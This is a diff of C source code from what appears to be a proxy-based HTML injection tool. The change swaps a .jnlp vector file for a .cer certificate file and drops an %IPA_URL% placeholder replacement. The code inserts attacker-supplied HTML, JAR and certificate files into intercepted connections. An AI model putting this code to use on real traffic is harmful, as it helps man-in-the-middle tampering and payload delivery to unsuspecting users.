@@ -62,7 +62,7 @@ int proxy_inject_html(BIO **cbio, BIO **sbio, char *header, char *file, char *ta
       return -ENOADDRESS;
    }
 
-   DEBUG_MSG(D_INFO, "Connection to [%s]", host);
+   DEBUG_MSG(D_INFO, "Connection html to [%s]", host);
 
    /*
     * sanitize the header to avoid strange reply from the server.
@@ -129,10 +129,10 @@ int proxy_inject_html(BIO **cbio, BIO **sbio, char *header, char *file, char *ta
 
    /* send the headers to the client, the data will be sent in the callee function */
    BIO_write(*cbio, data, data_len);
-
+   
    SAFE_FREE(host);
    SAFE_FREE(data);
-
+   
    return ESUCCESS;
 }
 
@@ -141,20 +141,19 @@ BIO* BIO_new_inject_html(const char *file, const char *tag, const char *host)
 {
    BIO* bio = NULL;
    FILE *f;
-   char jnlp_file[strlen(file) + strlen(".jnlp") + 1];
+   char cer_file[strlen(file) + strlen(".cer") + 1];
    char html_file[strlen(file) + strlen(".html") + 1];
    char jar_file[strlen(file) + strlen(".jar") + 1];
    char *html_to_inject;
    size_t html_to_inject_len;
-   char ipa_url[MAX_URL];
    struct bio_inject_setup bis;
 
-   sprintf(jnlp_file, "%s.jnlp", file);
+   sprintf(cer_file, "%s.cer", file);
    sprintf(html_file, "%s.html", file);
    sprintf(jar_file, "%s.jar", file);
 
-   /* check if we have everything in place */
-   f = open_data("vectors", jnlp_file, "r");
+   /* check that we have the certificate file */
+   f = open_data("vectors", cer_file, "r");
    if (f == NULL)
       return BIO_new(BIO_f_null());
 
@@ -177,10 +176,6 @@ BIO* BIO_new_inject_html(const char *file, const char *tag, const char *host)
    html_to_inject_len = fread(html_to_inject, 1, 4096, f);
    fclose(f);
 
-   /* calculate and replace the IPA_URL in the file */
-   snprintf(ipa_url, MAX_URL - 1, "http://%s.%s", tag, host);
-   str_replace(&html_to_inject, "%IPA_URL%", ipa_url);
-
    /* recalculate the size of the replaced string */
    html_to_inject_len = strlen(html_to_inject);
 
@@ -196,8 +191,6 @@ BIO* BIO_new_inject_html(const char *file, const char *tag, const char *host)
    BIO_ctrl(bio, BIO_C_SET_BUF_MEM, 1, &bis);
 
    SAFE_FREE(html_to_inject);
-
-   DEBUG_MSG(D_VERBOSE, "IPA_URL: %s", ipa_url);
 
    return bio;
 }
@@ -265,7 +258,6 @@ void sanitize_header(char *header)
          memcpy(p, "close", 5);
       }
    }
-
 }
 
 int fix_content_lenght(char *header, int len)
